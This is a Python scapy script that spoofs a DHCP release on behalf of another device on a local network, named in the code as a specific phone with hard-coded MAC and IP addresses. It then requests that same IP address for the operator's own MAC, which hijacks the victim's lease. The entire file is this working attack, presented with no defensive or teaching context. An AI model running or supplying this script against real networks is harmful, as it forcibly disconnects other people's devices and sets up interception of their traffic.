from scapy.all import *
import time
import binascii



def BOOTP_mac(regular_mac : str):
        regular_mac = regular_mac.replace(':', '')
        #BOOTP accepts raw mac for some reason
        return binascii.unhexlify(regular_mac)


def DHCP_Release(server_mac : str ,server_ip : str, client_ip : str , client_mac : str, client_transaction_id : hex):

    

    dhcp_options= [('message-type','release'), ('server_id', server_ip),('end')]


    releaseMyIp = Ether(dst=server_mac, src=client_mac)\
                    / IP(dst=server_ip,src=client_ip,ttl=5)\
                    / UDP(dport=67,sport=68)\
                    / BOOTP(htype=1,op=1,chaddr=BOOTP_mac(client_mac), xid = client_transaction_id, ciaddr = client_ip, hops = 2)\
                    / DHCP(options=dhcp_options)
    sendp(releaseMyIp)

def DHCP_Request( client_ip : str, device_mac : str, client_transaction_id):
    dhcp_options= [('message-type','request'), ('client_id', my_mac), ('requested_addr', client_ip),('server_id', server_ip), ('hostname', 'host'),('end')]
    
    request_packet = Ether(dst='ff:ff:ff:ff:ff:ff', src=my_mac)\
                    / IP(dst='255.255.255.255',src='0.0.0.0',ttl=5)\
                    / UDP(dport=67,sport=68)\
                    / BOOTP(htype=1,op=1,chaddr=BOOTP_mac(my_mac), hops = 2, xid = client_transaction_id)\
                    / DHCP(options=dhcp_options)
    srp1(request_packet)

client_mac = 'e2:b2:1a:da:85:24'
client_ip='192.168.1.41'
client_hostname='POCO-X4-Pro-5G'
client_transaction_id=0x3c1588a6
server_ip='192.168.1.1'
server_mac = getmacbyip(server_ip)

my_mac='58:11:22:81:da:a1'

DHCP_Release(server_mac, server_ip, client_ip, client_mac, client_transaction_id)
DHCP_Request(client_ip, my_mac, client_transaction_id)
